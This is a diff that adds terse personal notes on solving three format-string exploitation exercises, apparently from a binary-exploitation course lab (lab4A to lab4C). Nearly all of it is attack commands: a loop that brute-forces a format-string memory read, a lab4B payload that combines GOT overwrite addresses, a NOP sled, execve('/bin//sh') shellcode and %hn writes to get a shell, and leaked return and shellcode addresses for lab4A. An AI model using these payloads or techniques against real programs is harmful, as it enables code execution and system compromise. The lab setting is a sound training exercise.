@@ -1,0 +1,8 @@
+lab4C: 
+	for i in {1..255}; do printf "\x$i\xf6\xff\xbf%%37"'$s\n' | ./lab4C; done | less
+	python -c 'print "\x06\xf6\xff\xbf%37$s"' | ./lab4C	
+lab4B: (python -c 'print "\xba\x99\x04\x08bbbb\xb8\x99\x04\x08" + "\x90"*20 + "\x31\xc0\x6a\x01\x83\x34\x24\x01\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "%49086x%6$hn."+"%13912x%8$hn"'; cat;) | ./lab4B
+lab4A:
+	get ret-addr val (probably not usefull): ./lab4A $(python -c 'print "XAAAA"+"%08x%77$08x"')
+	ret-address: 0xbffff55c
+	shellcode: 0xbffff49c
